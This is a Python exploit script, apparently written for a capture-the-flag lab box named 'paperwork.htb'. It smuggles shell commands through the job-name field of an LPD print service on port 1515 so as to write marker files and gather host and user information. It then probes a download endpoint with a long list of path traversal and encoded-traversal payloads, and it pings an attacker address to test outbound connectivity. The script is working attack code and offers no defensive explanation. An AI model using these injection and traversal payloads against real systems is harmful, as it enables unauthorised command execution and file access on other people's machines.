#!/usr/bin/env python3
"""Phase 1: Verify RCE - inject marker files via LPD, try to read via web"""
import socket, time, urllib.request, urllib.error, sys

TARGET = '10.129.38.158'
MARKER = f"RCE_CONFIRMED_{int(time.time())}_{id({})}"

def lpd(job_name, timeout=8):
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((TARGET, 1515))
        s.send(b'\x02archive_intake')
        time.sleep(0.2)
        s.recv(1024)
        ct = (f'J{job_name}\n').encode()
        s.send(b'\x01' + str(len(ct)).encode() + b'\n' + ct)
        time.sleep(0.4)
        s.recv(4096)
        time.sleep(0.2)
        s.recv(4096)
    except:
        pass
    s.close()

def http_check(path):
    """Returns (status, body) or None on failure"""
    for host in ['paperwork.htb']:
        try:
            req = urllib.request.Request(f'http://{TARGET}{path}',
                headers={'Host': host})
            resp = urllib.request.urlopen(req, timeout=5)
            return (resp.status, resp.read())
        except urllib.error.HTTPError as e:
            return (e.code, e.read() if hasattr(e, 'read') else b'')
        except:
            pass
    return None

print(f"[*] Marker: {MARKER}", flush=True)
print(f"[*] Target: {TARGET}", flush=True)

# === STEP 1: Inject marker files to MANY locations ===
print("\n[1] Injecting marker files via LPD...", flush=True)
locs = [
    f"';echo {MARKER} > /tmp/rce_marker;'",
    f"';echo {MARKER} > /var/tmp/rce_marker;'",
    f"';echo {MARKER} > /dev/shm/rce_marker;'",
    f"';echo {MARKER} > /opt/rce_marker;'",
    f"';mkdir -p /var/www/html 2>/dev/null; echo {MARKER} > /var/www/html/rce_marker;'",
    f"';mkdir -p /usr/share/nginx/html 2>/dev/null; echo {MARKER} > /usr/share/nginx/html/rce_marker;'",
    f"';mkdir -p /var/www/paperwork.htb 2>/dev/null; echo {MARKER} > /var/www/paperwork.htb/rce_marker;'",
    f"';mkdir -p /srv/http 2>/dev/null; echo {MARKER} > /srv/http/rce_marker;'",
    f"';echo test > /tmp/archive.log; echo {MARKER} >> /tmp/archive.log;'",
    # Try to find web root by writing to common locations
    f"';for d in /var/www /usr/share/nginx /srv /opt /home/lp; do echo {MARKER} > \"$d/rce_marker\" 2>/dev/null; done;'",
]
for j in locs:
    lpd(j)
    time.sleep(0.3)
time.sleep(2)

# === STEP 2: Try every possible web path to read the marker ===
print("\n[2] Probing web paths for marker...", flush=True)
paths = [
    # Direct paths
    '/rce_marker',
    '/tmp/rce_marker',
    '/var/tmp/rce_marker',
    '/archive.log',
    '/tmp/archive.log',
    # Download endpoint variants
    '/download/rce_marker',
    '/download/../rce_marker',
    '/download/../../rce_marker',
    '/download/../../../rce_marker',
    '/download/../../../../rce_marker',
    # Double-encoded path traversal
    '/download/%2e%2e/rce_marker',
    '/download/%2e%2e/%2e%2e/rce_marker',
    '/download/%2e%2e/%2e%2e/%2e%2e/rce_marker',
    '/download/..%2frce_marker',
    '/download/..%2f..%2frce_marker',
    '/download/%2e%2e%2frce_marker',
    # Triple encoding
    '/download/%252e%252e%252frce_marker',
    '/download/%252e%252e/%252e%252e/%252e%252e/rce_marker',
    '/download/..%252f..%252f..%252frce_marker',
    '/download/..%c0%ae..%c0%ae/rce_marker',
    '/download/..%c0%ae..%c0%ae..%c0%ae/rce_marker',
    # Various path traversal tricks
    '/download/....//....//....//rce_marker',
    '/download/..\\/..\\/..\\/rce_marker',
    '/download/..;/rce_marker',
    # Static file paths that might alias to /tmp
    '/static/rce_marker',
    '/assets/rce_marker',
    '/uploads/rce_marker',
    '/files/rce_marker',
    '/media/rce_marker',
    # Other potential paths
    '/api/rce_marker',
    '/console/rce_marker',
    '/admin/rce_marker',
    '/backup/rce_marker',
    '/logs/rce_marker',
    # Nginx temp/locations
    '/.tmp/rce_marker',
    '/_tmp/rce_marker',
    '/private/rce_marker',
    # Check if the web root itself is accessible
    '/download/archive.log',
    '/download/..%2farchive.log',
    '/download/..%2f..%2f..%2ftmp/archive.log',
    '/.htaccess',
    '/.env',
    '/paperwork.htb/rce_marker',
]

found = False
for p in paths:
    result = http_check(p)
    if result:
        status, body = result
        body_str = body.decode(errors='replace')
        if MARKER in body_str:
            print(f"  *** RCE CONFIRMED! Marker found at {p} (HTTP {status})", flush=True)
            found = True
        elif status not in (404, 400):
            print(f"  INTERESTING: {p} -> HTTP {status} ({len(body)}b) {body_str[:100]}", flush=True)

if not found:
    print("\n[!] Marker not found via web paths. Trying fallback methods...", flush=True)

# === STEP 3: Try to verify via queue state side-channel ===
# The queue state might change if we modify the daemon
print("\n[3] Checking queue state behavior...", flush=True)
s = socket.socket()
s.settimeout(5)
s.connect((TARGET, 1515))
s.send(b'\x03archive_intake')
time.sleep(1)
data = s.recv(4096)
print(f"  Queue state: {data}", flush=True)
s.close()

# === STEP 4: Inject command that tests connectivity ===
print("\n[4] Testing outbound connectivity from target...", flush=True)
lpd(f"';ping -c 2 10.10.14.18 2>/dev/null > /tmp/ping_test;'")
lpd(f"';hostname > /tmp/host_info; whoami >> /tmp/host_info; id >> /tmp/host_info;'")
lpd(f"';ls -la /home/ > /tmp/home_dir 2>/dev/null;'")
time.sleep(2)

print("\n[*] Phase 1 complete.", flush=True)
if found:
    print("[*] RESULT: RCE CONFIRMED via web path!!!", flush=True)
else:
    print("[*] RESULT: RCE not verifiable via web. Moving to Phase 2 (binary detection).", flush=True)
